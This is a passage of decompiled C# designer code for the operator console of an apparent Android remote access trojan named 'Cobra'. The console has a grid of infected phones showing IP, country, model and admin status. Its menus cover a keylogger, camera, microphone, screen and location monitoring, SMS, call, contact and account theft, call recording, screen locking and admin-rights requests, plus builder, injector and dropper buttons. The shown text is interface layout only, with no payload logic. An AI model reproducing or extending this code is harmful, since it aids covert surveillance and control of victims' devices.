		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle22 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle23 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle24 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle25 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle26 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle27 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle28 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle29 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle30 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle31 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle32 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle33 = new System.Windows.Forms.DataGridViewCellStyle();
		this.notfi = new System.Windows.Forms.NotifyIcon(this.components);
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.Mainpanel = new System.Windows.Forms.Panel();
		this.infotitlepanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.infopanel = new System.Windows.Forms.Panel();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.mappanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.MapPannel = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.infobox = new DrakeUI.Framework.DrakeUIGroupBox();
		this.infotext = new DrakeUI.Framework.DrakeUILabel();
		this.DrakeUIAvatar3 = new DrakeUI.Framework.DrakeUIAvatar();
		this.ReciveBox = new DrakeUI.Framework.DrakeUIGroupBox();
		this.recvtotal = new DrakeUI.Framework.DrakeUILabel();
		this.DrakeUIAvatar6 = new DrakeUI.Framework.DrakeUIAvatar();
		this.SentBox = new DrakeUI.Framework.DrakeUIGroupBox();
		this.senttotal = new DrakeUI.Framework.DrakeUILabel();
		this.DrakeUIAvatar7 = new DrakeUI.Framework.DrakeUIAvatar();
		this.RecentBox = new DrakeUI.Framework.DrakeUIGroupBox();
		this.lastclienttext = new DrakeUI.Framework.DrakeUILabel();
		this.lastclientpic = new DrakeUI.Framework.DrakeUIAvatar();
		this.DashboardPanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.ClientsWindow = new DrakeUI.Framework.DrakeUIDataGridView();
		this.cliscren = new System.Windows.Forms.DataGridViewImageColumn();
		this.cliav = new System.Windows.Forms.DataGridViewImageColumn();
		this.cliflg = new System.Windows.Forms.DataGridViewImageColumn();
		this.cliname = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.clicountry = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.cliip = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.andver = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.phondmod = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.clinoti = new System.Windows.Forms.DataGridViewImageColumn();
		this.clicalls = new System.Windows.Forms.DataGridViewImageColumn();
		this.clibtry = new System.Windows.Forms.DataGridViewImageColumn();
		this.cliwifi = new System.Windows.Forms.DataGridViewImageColumn();
		this.cliavt = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.defcli = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.isadmincli = new System.Windows.Forms.DataGridViewImageColumn();
		this.clipng = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.instdate = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ctxmenu = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.ManagersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FilesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SMSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CallsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ContactsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.AccountsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ApplicationsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.MonitorsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ScreenMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
		this.CameraMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MicrophoneMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.KeyloggerToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.LocationsMonitorToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.LiveModeToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
		this.SilentModeGOIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.WebBrowserToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.CallRecorderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.ScreenReaderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.AdminToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RequestAdminRightsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.LockScreenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
		this.ExtraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.NotificationListnerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CallsListnerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PhoneInformationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
		this.ToolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
		this.KeyboardToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.ClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MonitorPanel = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon19 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon18 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon17 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.camerabtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.accountbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.screenbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.callsbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.filebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Hinfobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.HBlockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.contactbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel16 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon16 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon14 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.micbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.screenreadbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.locationbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon6 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel20 = new System.Windows.Forms.Panel();
		this.FWPANEL = new System.Windows.Forms.Panel();
		this.Label4 = new System.Windows.Forms.Label();
		this.DrakeUIAvatar9 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar5 = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIAvatar8 = new DrakeUI.Framework.DrakeUIAvatar();
		this.FWstatus = new DrakeUI.Framework.DrakeUIAvatar();
		this.DGFW = new System.Windows.Forms.DataGridView();
		this.FWctx = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.AllowAppToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem25 = new System.Windows.Forms.ToolStripMenuItem();
		this.TRKPANEL = new System.Windows.Forms.Panel();
		this.DGVTRK = new System.Windows.Forms.DataGridView();
		this.TRKctx = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.ToolStripMenuItem24 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem23 = new System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel17 = new System.Windows.Forms.Panel();
		this.Label5 = new System.Windows.Forms.Label();
		this.combodatestrack = new DrakeUI.Framework.DrakeUIComboBox();
		this.DrakeUIAvatar11 = new DrakeUI.Framework.DrakeUIAvatar();
		this.recordsShowpanel = new System.Windows.Forms.Panel();
		this.recordshowtext = new System.Windows.Forms.TextBox();
		this.DrakeUIButtonIcon20 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.applicationsbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.keyloggerbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.smsbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.clearsrchbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		this.searchbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.Panel18 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
		this.TCavatar = new System.Windows.Forms.PictureBox();
		this.uncheckbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clientfoldrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIAvatar4 = new DrakeUI.Framework.DrakeUIAvatar();
		this.Panel19 = new System.Windows.Forms.Panel();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.label16 = new System.Windows.Forms.Label();
		this.DrakeUIButtonIcon9 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon8 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.serverspanel = new System.Windows.Forms.Panel();
		this.DGVSERVS = new System.Windows.Forms.DataGridView();
		this.statusico = new System.Windows.Forms.DataGridViewImageColumn();
		this.portnam = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel13 = new System.Windows.Forms.Panel();
		this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
		this.rempo = new DrakeUI.Framework.DrakeUIAvatar();
		this.porttext = new DrakeUI.Framework.DrakeUITextBox();
		this.checksavepass = new DrakeUI.Framework.DrakeUICheckBox();
		this.passtxt = new DrakeUI.Framework.DrakeUITextBox();
		this.tipkey = new DrakeUI.Framework.DrakeUIAvatar();
		this.notificationspanel = new System.Windows.Forms.Panel();
		this.callspanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.DGVCALLS = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn3 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.activityzpanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.DGVALRTS = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn4 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.notifispanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.DGVNOTF = new System.Windows.Forms.DataGridView();
		this.cliimg = new System.Windows.Forms.DataGridViewImageColumn();
		this.notitext = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel12 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon11 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon10 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon7 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.blockpanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.DGVblocked = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn1 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ctxconnection = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.BlockClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.addpo = new DrakeUI.Framework.DrakeUIAvatar();
		this.toblocktext = new DrakeUI.Framework.DrakeUITextBox();
		this.connectionpanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.DataLog = new System.Windows.Forms.DataGridView();
		this.DataGridViewImageColumn2 = new System.Windows.Forms.DataGridViewImageColumn();
		this.DataGridViewTextBoxColumn5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DataGridViewTextBoxColumn7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dattim = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.blockctx = new DrakeUI.Framework.DrakeUIContextMenuStrip();
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.Panel11 = new System.Windows.Forms.Panel();
		this.clearbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.checkclearlogs = new DrakeUI.Framework.DrakeUICheckBox();
		this.checkenablelogs = new DrakeUI.Framework.DrakeUICheckBox();
		this.TopPanel = new System.Windows.Forms.Panel();
		this.blockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Connection_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.serversbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.notifiaisbtntop = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Clients_Btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Home_Btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.supportbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon13 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon12 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label1 = new System.Windows.Forms.Label();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Settings_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.droperbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.studiobtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.inject_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Build_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.About_btn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.bigtitletext = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.Label2 = new System.Windows.Forms.Label();
		this.StatusPanel = new System.Windows.Forms.Panel();
		this.infolowtext = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.ToolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.notifiform = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.ToolTips = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.checkupdate = new System.Windows.Forms.Timer(this.components);
		this.mapworker = new System.ComponentModel.BackgroundWorker();
		this.Statustimer = new System.Windows.Forms.Timer(this.components);
		this.Panel10 = new System.Windows.Forms.Panel();
		this.Panel15 = new System.Windows.Forms.Panel();
		this.ImageList1 = new System.Windows.Forms.ImageList(this.components);
		this.monitortimer = new System.Windows.Forms.Timer(this.components);
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Mainpanel.SuspendLayout();
		this.infotitlepanel.SuspendLayout();
		this.infopanel.SuspendLayout();
		this.Panel5.SuspendLayout();
		this.mappanel.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.infobox.SuspendLayout();
		this.ReciveBox.SuspendLayout();
		this.SentBox.SuspendLayout();
		this.RecentBox.SuspendLayout();
		this.DashboardPanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientsWindow).BeginInit();
		this.ctxmenu.SuspendLayout();
		this.MonitorPanel.SuspendLayout();
		this.Panel16.SuspendLayout();
		this.Panel20.SuspendLayout();
		this.FWPANEL.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGFW).BeginInit();
		this.FWctx.SuspendLayout();
		this.TRKPANEL.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVTRK).BeginInit();
		this.TRKctx.SuspendLayout();
		this.Panel17.SuspendLayout();
		this.recordsShowpanel.SuspendLayout();
		this.Panel6.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.TCavatar).BeginInit();
		this.Panel7.SuspendLayout();
		this.serverspanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVSERVS).BeginInit();
		this.Panel13.SuspendLayout();
		this.notificationspanel.SuspendLayout();
		this.callspanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVCALLS).BeginInit();
		this.activityzpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVALRTS).BeginInit();
		this.notifispanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVNOTF).BeginInit();
		this.Panel12.SuspendLayout();
		this.blockpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVblocked).BeginInit();
		this.ctxconnection.SuspendLayout();
		this.Panel9.SuspendLayout();
		this.connectionpanel.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DataLog).BeginInit();
		this.blockctx.SuspendLayout();
		this.Panel11.SuspendLayout();
		this.TopPanel.SuspendLayout();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.StatusPanel.SuspendLayout();
		base.SuspendLayout();
		this.notfi.Icon = (System.Drawing.Icon)resources.GetObject("notfi.Icon");
		this.notfi.Text = "Cobra";
		this.notfi.Visible = true;
		this.TOpacity.Interval = 10;
		this.Mainpanel.Controls.Add(this.DashboardPanel);
		this.Mainpanel.Controls.Add(this.serverspanel);
		this.Mainpanel.Controls.Add(this.notificationspanel);
		this.Mainpanel.Controls.Add(this.blockpanel);
		this.Mainpanel.Controls.Add(this.connectionpanel);
		this.Mainpanel.Controls.Add(this.TopPanel);
		this.Mainpanel.Controls.Add(this.Panel3);
		this.Mainpanel.Controls.Add(this.StatusPanel);
		this.Mainpanel.Controls.Add(this.Panel1);
		this.Mainpanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Mainpanel.Location = new System.Drawing.Point(8, 8);
		this.Mainpanel.Name = "Mainpanel";
		this.Mainpanel.Size = new System.Drawing.Size(1197, 618);
		this.Mainpanel.TabIndex = 3;
		this.infotitlepanel.Controls.Add(this.infopanel);
		this.infotitlepanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.infotitlepanel.FillColor = System.Drawing.Color.SkyBlue;
		this.infotitlepanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.infotitlepanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.infotitlepanel.Location = new System.Drawing.Point(124, 34);
		this.infotitlepanel.Margin = new System.Windows.Forms.Padding(4);
		this.infotitlepanel.Name = "infotitlepanel";
		this.infotitlepanel.RectColor = System.Drawing.Color.Black;
		this.infotitlepanel.Size = new System.Drawing.Size(1065, 569);
		this.infotitlepanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.infotitlepanel.TabIndex = 3;
		this.infotitlepanel.Text = "RAT";
		this.infotitlepanel.TitleColor = System.Drawing.Color.Black;
		this.infotitlepanel.TitleHeight = 0;
		this.infopanel.BackColor = System.Drawing.Color.BlanchedAlmond;
		this.infopanel.Controls.Add(this.Panel5);
		this.infopanel.Controls.Add(this.Panel2);
		this.infopanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.infopanel.Location = new System.Drawing.Point(0, 0);
		this.infopanel.Name = "infopanel";
		this.infopanel.Size = new System.Drawing.Size(1065, 569);
		this.infopanel.TabIndex = 13;
		this.Panel5.BackColor = System.Drawing.Color.Black;
		this.Panel5.Controls.Add(this.mappanel);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel5.Location = new System.Drawing.Point(0, 0);
		this.Panel5.Margin = new System.Windows.Forms.Padding(2);
		this.Panel5.Name = "Panel5";
		this.Panel5.Size = new System.Drawing.Size(1065, 398);
		this.Panel5.TabIndex = 6;
		this.mappanel.Controls.Add(this.MapPannel);
		this.mappanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mappanel.FillColor = System.Drawing.Color.Black;
		this.mappanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.mappanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.mappanel.Location = new System.Drawing.Point(0, 0);
		this.mappanel.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.mappanel.Name = "mappanel";
		this.mappanel.Padding = new System.Windows.Forms.Padding(0, 26, 0, 0);
		this.mappanel.Radius = 55;
		this.mappanel.RectColor = System.Drawing.Color.SkyBlue;
		this.mappanel.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.mappanel.Size = new System.Drawing.Size(1065, 398);
		this.mappanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.mappanel.StyleCustomMode = true;
		this.mappanel.TabIndex = 0;
		this.mappanel.Text = null;
		this.mappanel.TitleColor = System.Drawing.Color.Black;
		this.MapPannel.BackColor = System.Drawing.Color.Black;
		this.MapPannel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.MapPannel.Location = new System.Drawing.Point(0, 26);
		this.MapPannel.Margin = new System.Windows.Forms.Padding(2);
		this.MapPannel.Name = "MapPannel";
		this.MapPannel.Size = new System.Drawing.Size(1065, 372);
		this.MapPannel.TabIndex = 5;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.infobox);
		this.Panel2.Controls.Add(this.ReciveBox);
		this.Panel2.Controls.Add(this.SentBox);
		this.Panel2.Controls.Add(this.RecentBox);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(0, 398);
		this.Panel2.Margin = new System.Windows.Forms.Padding(2);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(1065, 171);
		this.Panel2.TabIndex = 5;
		this.infobox.Controls.Add(this.infotext);
		this.infobox.Controls.Add(this.DrakeUIAvatar3);
		this.infobox.FillColor = System.Drawing.Color.Black;
		this.infobox.Font = new System.Drawing.Font("Calibri", 25f);
		this.infobox.ForeColor = System.Drawing.Color.SkyBlue;
		this.infobox.Location = new System.Drawing.Point(20, 15);
		this.infobox.Margin = new System.Windows.Forms.Padding(4);
		this.infobox.Name = "infobox";
		this.infobox.Padding = new System.Windows.Forms.Padding(0, 29, 0, 0);
		this.infobox.RectColor = System.Drawing.Color.SkyBlue;
		this.infobox.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.infobox.Size = new System.Drawing.Size(233, 122);
		this.infobox.Style = DrakeUI.Framework.UIStyle.Custom;
		this.infobox.StyleCustomMode = true;
		this.infobox.TabIndex = 0;
		this.infobox.Text = "Cobra Info";
		this.infotext.BackColor = System.Drawing.Color.Transparent;
		this.infotext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.infotext.Font = new System.Drawing.Font("Calibri", 15f);
		this.infotext.ForeColor = System.Drawing.Color.SkyBlue;
		this.infotext.Location = new System.Drawing.Point(0, 29);
		this.infotext.Name = "infotext";
		this.infotext.Size = new System.Drawing.Size(192, 93);
		this.infotext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.infotext.StyleCustomMode = true;
		this.infotext.TabIndex = 11;
		this.infotext.Text = "Online : 0\r\nPort : ....\r\nKey : ....";
		this.infotext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.DrakeUIAvatar3.AvatarSize = 140;
		this.DrakeUIAvatar3.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar3.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar3.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar3.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar3.Location = new System.Drawing.Point(192, 29);
		this.DrakeUIAvatar3.Name = "DrakeUIAvatar3";
		this.DrakeUIAvatar3.Size = new System.Drawing.Size(41, 93);
		this.DrakeUIAvatar3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar3.StyleCustomMode = true;
		this.DrakeUIAvatar3.Symbol = 62144;
		this.DrakeUIAvatar3.SymbolSize = 64;
		this.DrakeUIAvatar3.TabIndex = 10;
		this.DrakeUIAvatar3.Text = "DrakeUIAvatar3";
		this.ReciveBox.Controls.Add(this.recvtotal);
		this.ReciveBox.Controls.Add(this.DrakeUIAvatar6);
		this.ReciveBox.FillColor = System.Drawing.Color.Black;
		this.ReciveBox.Font = new System.Drawing.Font("Calibri", 25f);
		this.ReciveBox.ForeColor = System.Drawing.Color.SkyBlue;
		this.ReciveBox.Location = new System.Drawing.Point(552, 15);
		this.ReciveBox.Margin = new System.Windows.Forms.Padding(4);
		this.ReciveBox.Name = "Cobra ReciveBox";
		this.ReciveBox.Padding = new System.Windows.Forms.Padding(0, 29, 0, 0);
		this.ReciveBox.RectColor = System.Drawing.Color.SkyBlue;
		this.ReciveBox.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.ReciveBox.Size = new System.Drawing.Size(230, 122);
		this.ReciveBox.Style = DrakeUI.Framework.UIStyle.Custom;
		this.ReciveBox.StyleCustomMode = true;
		this.ReciveBox.TabIndex = 1;
		this.ReciveBox.Text = "Cobra Received";
		this.recvtotal.BackColor = System.Drawing.Color.Transparent;
		this.recvtotal.Dock = System.Windows.Forms.DockStyle.Fill;
		this.recvtotal.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold);
		this.recvtotal.ForeColor = System.Drawing.Color.SkyBlue;
		this.recvtotal.Location = new System.Drawing.Point(0, 29);
		this.recvtotal.Name = "recvtotal";
		this.recvtotal.Size = new System.Drawing.Size(175, 93);
		this.recvtotal.Style = DrakeUI.Framework.UIStyle.Custom;
		this.recvtotal.StyleCustomMode = true;
		this.recvtotal.TabIndex = 11;
